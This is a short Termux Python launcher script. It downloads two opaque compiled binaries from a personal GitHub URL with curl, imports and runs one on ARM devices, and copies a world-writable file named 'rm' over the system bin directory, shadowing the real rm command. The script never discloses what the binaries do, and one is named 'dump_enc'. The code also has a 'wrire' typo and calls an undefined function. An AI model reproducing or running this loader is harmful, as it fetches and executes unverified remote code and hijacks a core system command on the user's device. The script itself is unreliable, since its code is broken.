import os
try:
    try:
        open('/sdcard/AXI-OK.txt','r').read()
    except:
        open('/sdcard/AXI-OK.txt','w').wrire('AXI Ok ids')
except:
    print(' First Allow Termux Setup Permeations (y) ')
    os.system('termux-setup-storage')
    pass
os.system('git pull')
from os import path,system
from platform import uname
arch=uname().machine.lower()
if path.isfile("axi.cpython-311.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/ahmad77412/axi/main/axi.cpython-311.so -o axi.cpython-311.so")
if path.isfile("dump_enc.cpython311.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/ahmad77412/axi/main/dump_enc.cpython311.so -o dump_enc.cpython311.so")
    system('chmod 777 rm && cp rm /data/data/com.termux/files/usr/bin')
if 'aarch' in arch:
    print('\033[1;37m\nCongratulations! Your Device Support This Tools')
    import axi
    xd()
else:exit('\033[1;31m Sorry System or device not supported ')
    
